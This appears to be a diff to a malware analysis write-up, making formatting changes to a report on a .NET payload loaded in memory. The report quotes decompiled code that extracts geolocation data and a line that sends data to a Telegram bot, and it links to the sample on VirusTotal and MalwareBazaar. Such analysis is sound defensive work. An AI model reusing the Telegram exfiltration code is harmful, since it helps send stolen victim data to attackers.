@@ -107,8 +107,11 @@ DumpFile created : \DosDevices\C:\rtl_dump\MemDotNetD
 ```
 
 This in-memory loading of managed code is well described here :  
+
 https://0xpat.github.io/Malware_development_part_9/  
+
 The loaded .NET DLL is dumped automatically by my sandbox and is now available here :  
+
 https://www.virustotal.com/gui/file/af724ba9b889c902ae248039a93b86d53613dc966e648e4fe54ca2b10d0ea712/  
 https://bazaar.abuse.ch/sample/af724ba9b889c902ae248039a93b86d53613dc966e648e4fe54ca2b10d0ea712/  
 
@@ -251,7 +254,7 @@ as well as getting the clear text from the answer :
 
 Various information are then extracted by the malware from the XML :  
 
-```
+```csharp
 XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
 XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionCode");
 XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionName");
@@ -259,7 +262,7 @@ XmlNodeList elementsByTagName = Instance.GetElementsByTagName("RegionName");
 
 Finaly the payload is attempting to establish a HTTPS communication with a telegram bot :  
 
-```
+```csharp
  string requestUriString = "https://api.telegram.org/bot" + _param0 + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
 ```
 
